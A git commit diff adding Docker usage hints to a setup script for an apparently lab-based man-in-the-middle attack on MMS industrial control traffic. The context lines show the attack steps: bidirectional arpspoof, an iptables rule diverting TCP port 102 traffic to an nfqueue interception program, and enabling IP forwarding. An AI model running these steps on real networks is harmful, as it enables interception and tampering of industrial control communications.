c54e7acb1ec1afd4423a71af657c5ac624ee1a16
perra22 <lperracchio21@gmail.com>
2020-04-15 04:28:52 -0400

    added instructions

--- mms/nfqueue/setup.sh
+++ mms/nfqueue/setup.sh
@@ -4,6 +4,8 @@ echo "[+] If it isn't run in two different terminal:"
 echo "[+] TERMINAL 1: arpspoof ip1 ip2"
 echo "[+] TERMINAL 2: arpspoof ip2 ip1"
 echo "[+] KEEP THOSE TERMINALS OPEN DURING THE ATTACK"
+echo "[+] to open multiple terminals in the same container:"
+echo "[+] docker exec -it <container> bash"
 g++ -o mms_nfq mms_nfq.cpp -lnetfilter_queue
 iptables -t mangle -A POSTROUTING -p tcp --sport 102 -j NFQUEUE
 sysctl -w net.ipv4.ip_forward=1
